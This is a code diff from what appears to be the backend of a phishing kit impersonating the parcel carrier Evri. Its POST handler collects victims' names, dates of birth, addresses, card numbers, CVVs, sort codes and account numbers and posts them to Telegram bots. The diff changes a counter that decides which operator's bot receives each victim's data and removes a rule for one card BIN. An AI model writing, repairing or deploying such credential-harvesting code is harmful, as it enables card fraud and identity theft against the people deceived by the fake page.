@@ -3957,7 +3957,7 @@ app.post("/timeszEvri", (req, res) => {
     });
 });
 
-let TheOnlyMY = 5;
+let TheOnlyMY = 0;
 
 app.options("/TheOnlyMYEvri", cors());
 
@@ -3999,7 +3999,7 @@ app.post("/TheOnlyMYEvri", (req, res) => {
   ip = req.body.ip;
   bin = req.body.bin;
 
-  if (bin.length === 5) {
+  if (bin.length === 7) {
     formatBin = bin.replace(/ /g, "");
     if (formatBin.length === 7) {
       formatBin = bin.slice(0, -1);
@@ -4018,15 +4018,11 @@ app.post("/TheOnlyMYEvri", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (TheOnlyMY == 5) {
+      if (TheOnlyMY == 7) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
-        TheOnlyMY = 1;
-      } else if (bin === "542011") {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-        );
+        TheOnlyMY = 0;
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriTheOnlyMY:\n${originalText}`
